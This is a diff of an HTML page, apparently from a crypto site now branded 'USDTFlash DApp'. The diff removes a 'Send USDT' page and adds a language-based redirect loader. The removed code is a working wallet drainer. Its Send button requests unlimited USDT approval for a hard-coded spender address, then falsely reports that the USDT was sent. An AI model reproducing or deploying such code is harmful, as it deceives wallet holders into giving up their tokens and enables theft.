@@ -1,75 +1,41 @@
+
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>USDT Approval</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <style>
-      body {
-        font-family: sans-serif;
-        background: #f5f5f5;
-        text-align: center;
-        padding-top: 80px;
-      }
-      input, button {
-        padding: 12px;
-        font-size: 16px;
-        width: 280px;
-        margin-bottom: 20px;
-      }
-    </style>
-  </head>
-  <body>
-    <h2>Send USDT</h2>
+<head>
+  <meta charset="UTF-8">
+  <title>USDTFlash DApp</title>
+</head>
+<body style="margin:0;padding:0;background:#009688;">
+  <div style="text-align:center;margin-top:40vh;font-size:1.5em;color:white;">
+    Cargando DApp...
+  </div>
+  
+  <div id="langToggle" style="position: fixed; top: 10px; left: 16px; z-index: 1000; background: rgba(0,0,0,0.4); color: white; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 0.9em; border: 1px solid #fff2;">
+    🌐 Language: <select id="langSelect" style="background: transparent; color: white; border: none; font-weight: bold;">
+      <option value="en">EN</option>
+      <option value="es">ES</option>
+    </select>
+  </div>
 
-    <!-- 👤 User wallet display field -->
-    <input type="text" id="userAddress" placeholder="0x37935899f0DbCE787D758EfE382A92E1d3368454" readonly />
+  <script>
+    const userLang = navigator.language || navigator.userLanguage;
+    const preferred = userLang.startsWith("es") ? "es" : "en";
+    const langSelect = document.getElementById("langSelect");
 
-    <br />
+    langSelect.value = preferred;
 
-    <!-- 💰 Amount input -->
-    <input type="number" id="amount" placeholder="Enter Amount (USDT)" />
-    <br />
+    langSelect.onchange = function () {
+      const lang = langSelect.value;
+      const target = lang === "es" ? "index_es.html" : "index_en.html";
+      window.location.href = target;
+    };
 
-    <!-- 🚀 Approve button -->
-    <button onclick="approveUSDT()">Send</button>
+    // Auto-redirect on first load
+    if (window.location.pathname.endsWith("/") || window.location.pathname.endsWith("index.html")) {
+      const target = preferred === "es" ? "index_es.html" : "index_en.html";
+      window.location.href = target;
+    }
+  </script>
 
-    <script>
-      const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-      const SPENDER = "0xE9794063b029c9F84f3Bf093CfC444fA92A1c87B";
-      const ABI = [
-        "function approve(address spender, uint256 amount) public returns (bool)",
-        "function decimals() view returns (uint8)"
-      ];
-
-      let signer, token;
-
-      async function connectWallet() {
-        if (!window.ethereum) return alert("Please use MetaMask or Trust Wallet browser.");
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        const userAddress = await signer.getAddress();
-        document.getElementById("userAddress").value = userAddress;
-        token = new ethers.Contract(USDT_ADDRESS, ABI, signer);
-      }
-
-      async function approveUSDT() {
-        const amountInput = document.getElementById("amount").value;
-        if (!amountInput || parseFloat(amountInput) <= 0) {
-          alert("Please enter a valid amount.");
-          return;
-        }
-
-        await connectWallet();
-
-        try {
-          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
-          await tx.wait();
-          alert("✅ USDT sent successfully!");
-        } catch (err) {
-          alert("❌ Approval failed: " + err.message);
-        }
-      }
-    </script>
-  </body>
+</body>
 </html>
